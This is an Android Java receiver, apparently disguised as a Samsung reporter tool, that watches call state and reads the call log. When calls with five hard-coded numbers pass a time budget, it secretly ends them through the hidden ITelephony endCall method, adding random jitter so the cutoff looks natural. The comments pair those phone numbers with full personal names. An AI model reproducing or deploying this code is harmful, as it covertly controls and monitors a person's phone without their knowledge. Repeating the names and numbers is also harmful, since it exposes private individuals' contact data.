package com.samsung.samsungreportertool;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.database.Cursor;
import android.provider.CallLog;
import android.provider.CallLog.Calls;
import android.widget.Toast;
import android.util.Log;
import android.net.Uri;

import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Timer;
import java.util.Calendar;
import java.util.TimerTask;
import java.lang.reflect.Method;

public class TBroadcastReceiver extends BroadcastReceiver {

    private static TelephonyManager telephony;
    private static Context m_context;
    private static Rule []rules;
    private static Timer timer;

    private static int lastState = TelephonyManager.CALL_STATE_IDLE;
    private static Date callStartTime;
    private static boolean isIncoming;
    private static String savedNumber; // because the passed incoming is only valid in ringing
    private static int interval;

    {
        interval = 3;
        timer = null;
        rules = new Rule[5];

        Rule rule = new Rule();
        rule.number = "1002424"; // Technology number
        rule.duration = 50;
        rules[0] = rule;

        rule = new Rule();
        rule.number = "9212168346"; // Astasheva Larisa Ivanovna
        rule.duration = 600;
        rules[1] = rule;

        rule = new Rule();
        rule.number = "9052383930"; // Astashev Maxim Sergeevich
        rule.duration = 540;
        rules[2] = rule;

        rule = new Rule();
        rule.number = "9532499917"; // Zueva Alina
        rule.duration = 660;
        rules[3] = rule;

        rule = new Rule();
        rule.number = "9532499917"; // Tamara Vasilievna
        rule.duration = 420;
        rules[4] = rule;
    }

    @Override
    public void onReceive(Context context, Intent intent) {

        telephony = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
        m_context = context;

        try {
            try {

                Debug.log("==========", new Date());
                Bundle bundle = intent.getExtras();

                if (Build.VERSION.SDK_INT == 23) { // 6.0

                    Debug.log("====23====", new Date());
                    Debug.dumpBundle(bundle);

                    // We listen to two intents.
                    // The new outgoing call only tells us of an outgoing call.
                    // We use it to get the number.

                    if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
                        savedNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
                    } else {
                        String stateStr = intent.getExtras().getString(TelephonyManager.EXTRA_STATE);
                        String number = intent.getExtras().getString(TelephonyManager.EXTRA_INCOMING_NUMBER);
                        int state = 0;
                        if (stateStr.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                            state = TelephonyManager.CALL_STATE_IDLE;
                        } else if (stateStr.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                            state = TelephonyManager.CALL_STATE_OFFHOOK;
                        } else if (stateStr.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                            state = TelephonyManager.CALL_STATE_RINGING;
                        }

                        onCallStateChanged(context, state, number);
                    }
                } else if (Build.VERSION.SDK_INT == 28) { // 9.0
                    Debug.log("====28====", new Date());
                    Debug.dumpBundle(bundle);
                }

            } catch (java.lang.Exception exception) {
                Debug.dumpException(exception);
            }
        } catch (java.lang.Exception exception) {
            exception.printStackTrace();
        }
    }

    //Derived classes should override these to respond to specific events of interest
    protected void onIncomingCallStarted(Context context, String number, Date start) {
        java.lang.String dbg = java.lang.String.format("On incoming call started: %s", number);
        Debug.log(dbg, new java.util.Date());
        take_over(context, number);
    }

    protected void onOutgoingCallStarted(Context context, String number, Date start) {
        java.lang.String dbg = java.lang.String.format("On outgoing call started: %s", number);
        Debug.log(dbg, new java.util.Date());
        take_over(context, number);
    }

    protected void onIncomingCallEnded(Context context, String number, Date start, Date end) {
        java.lang.String dbg = java.lang.String.format("On incoming call ended: %s", number);
        Debug.log(dbg, new java.util.Date());
        if(timer != null) {
            timer.cancel();
            timer = null;
        }
    }

    protected void onOutgoingCallEnded(Context context, String number, Date start, Date end) {
        java.lang.String dbg = java.lang.String.format("On outgoing call ended: %s", number);
        Debug.log(dbg, new java.util.Date());
        if(timer != null) {
            timer.cancel();
            timer = null;
        }
    }

    protected void onMissedCall(Context context, String number, Date start) {
        java.lang.String dbg = java.lang.String.format("On missed call: %s", number);
        Debug.log(dbg, new java.util.Date());
        if(timer != null) {
            timer.cancel();
            timer = null;
        }
    }

    public void onCallStateChanged(Context context, int state, String number) {
        if(lastState == state){
            // No change, debounce extras
            return;
        }
        switch (state) {
            case TelephonyManager.CALL_STATE_RINGING:
                isIncoming = true;
                callStartTime = new Date();
                savedNumber = number;
                onIncomingCallStarted(context, number, callStartTime);
                break;
            case TelephonyManager.CALL_STATE_OFFHOOK:
                // Transition of ringing->offhook are pickups of incoming calls. Nothing done on them
                if(lastState != TelephonyManager.CALL_STATE_RINGING){
                    isIncoming = false;
                    callStartTime = new Date();
                    onOutgoingCallStarted(context, savedNumber, callStartTime);
                }
                break;
            case TelephonyManager.CALL_STATE_IDLE:
                // Went to idle- this is the end of a call. What type depends on previous state(s)
                if(lastState == TelephonyManager.CALL_STATE_RINGING){
                    // Ring but no pickup- a miss
                    onMissedCall(context, savedNumber, callStartTime);
                }
                else if(isIncoming){
                    onIncomingCallEnded(context, savedNumber, callStartTime, new Date());
                }
                else{
                    onOutgoingCallEnded(context, savedNumber, callStartTime, new Date());
                }
                break;
        }
        lastState = state;
    }

    private void TimerMethod() {
        try {

            Debug.log("Shutdown begin", new java.util.Date());

            Class<?> c = Class.forName(telephony.getClass().getName());
            Method m = c.getDeclaredMethod("getITelephony");
            m.setAccessible(true);
            Object telephonyService = m.invoke(telephony);
            Class<?> telephonyServiceClass = Class.forName(telephonyService.getClass().getName());
            Method endCallMethod = telephonyServiceClass.getDeclaredMethod("endCall");
            endCallMethod.setAccessible(true);
            endCallMethod.invoke(telephonyService);

            Debug.log("Shutdown end", new java.util.Date());

        } catch (Exception e) {
            Debug.dumpException(e);
        }
    }

    private int getRandomDelta() {
        Calendar calendar = Calendar.getInstance();
        int week = calendar.get(Calendar.DAY_OF_WEEK);
        int day = calendar.get(Calendar.DAY_OF_MONTH) % 5;
        return week * day;
    }

    private int getDurationByNumber(Context context, java.lang.String telephone_number, java.util.Date after) {

        java.lang.String dbg = java.lang.String.format("Get duration about %s", telephone_number);
        Debug.log(dbg, new java.util.Date());

        int duration_overall = 0;
        String[] projection = new String[] {
                CallLog.Calls._ID,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
        };

        try {

            Calendar calendar = Calendar.getInstance();
            calendar.setTime(after);

            Cursor cursor =  context.getApplicationContext().getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    projection,
                    CallLog.Calls.DATE + " >= ?",
                    new String[] { Long.toString(calendar.getTimeInMillis()) },
                    null
            );

            while (cursor.moveToNext()) {
                String id = cursor.getString(0);
                String name = cursor.getString(1);
                String number = cursor.getString(2);
                String type = cursor.getString(3);
                String time = cursor.getString(4);
                int duration = cursor.getInt(5);
                Debug.log(type + " | " + time + " | " + number + " ! " + duration);
                if(number.contains(telephone_number)) {
                    duration_overall += duration;
                }
            }
            cursor.close();

        } catch (Exception e) {
            Debug.dumpException(e);
        }
        return duration_overall;
    }

    private void take_over(Context context, java.lang.String number) {
        if(timer == null) {
            for (Rule rule : rules) {
                if (number.contains(rule.number)) {
                    Calendar cal = Calendar.getInstance();
                    cal.add(Calendar.HOUR, -interval);
                    java.util.Date after = cal.getTime();
                    int duration = getDurationByNumber(context, number, after);

                    String dbg = String.format("Duration of %s is %d", number, duration);
                    Debug.log(dbg, new Date());

                    int left = 5;
                    if (duration < rule.duration) {
                        left = rule.duration - duration;
                        java.util.Random r = new java.util.Random();
                        int min = 10;
                        int max = 20;
                        left = left + r.nextInt(max - min + 1) + min;
                    }

                    dbg = String.format("Terminater %s after %d", number, left);
                    Debug.log(dbg, new Date());

                    timer = new Timer();
                    timer.schedule(new TimerTask() {
                        @Override
                        public void run() {
                            TimerMethod();
                        }
                    }, left * 1000);

                    break;
                }
            }
        }
    }

}
